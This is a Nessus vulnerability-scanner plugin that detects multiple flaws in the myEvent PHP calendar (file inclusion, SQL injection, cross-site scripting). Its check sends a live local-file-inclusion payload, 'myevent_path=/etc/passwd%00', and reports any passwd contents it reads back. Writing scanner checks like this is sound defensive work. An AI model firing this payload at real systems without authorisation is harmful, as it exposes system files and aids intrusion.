#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

# Changes by Tenable:
# - Revised plugin title (3/26/2009)


include("compat.inc");

if (description) {
  script_id(21246);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-1890", "CVE-2006-1907", "CVE-2006-1908");
  script_bugtraq_id(17575, 17580);
  script_osvdb_id(24719, 24720, 24721, 24722, 24723, 24724, 24725);

  script_name(english:"myEvent Multiple Remote Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running myEvent, a calendar application written in
PHP.

The installed version of myEvent fails to sanitize user input to the
'myevent_path' parameter in several scripts before using it to include
PHP code from other files.  An unauthenticated attacker may be able to
read arbitrary local files or include a file from a remote host that
contains commands which will be executed on the remote host subject to
the privileges of the web server process.

In addition, user input to the 'event_id' parameter in 'addevent.php'
and 'del.php', and to the 'event_desc' parameter in 'addevent.php' is
not properly sanitized before being used in a SQL query, which could
allow an attacker to insert arbitrary SQL statements in the remote
database.  A similar lack of sanitation involving the 'event_desc'
parameter of 'addevent.php' allows for cross-site scripting attacks
against the affected application.

These flaws are exploitable only if PHP's register_globals is enabled." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/lists/bugtraq/2006/Apr/0331.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/16");
 script_cvs_date("$Date: 2015/09/24 21:17:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  summary["english"] = "Checks for file includes in myevent.php";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_require_keys("www/PHP");
  exit(0);
}


include("http_func.inc");
include("global_settings.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in viewevent.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/myevent.php?",
      "myevent_path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # It looks like myEvent and...
    'href="http://www.mywebland.com">myEvent' >< res  &&
    ( 
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "Failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but passing 
      #     remote URLs might still work.
      egrep(string:res, pattern:"Warning.+/etc/passwd.+failed to open stream") ||
      egrep(string:res, pattern:"Warning.+ Failed opening '/etc/passwd.+for inclusion")
    )
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      content = res;
      if (content) content = content - strstr(content, "<html>");
    }

    if (content)
    {
      report = string(
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
      security_hole(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value:TRUE);
      exit(0);
    }

    security_hole(port:port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
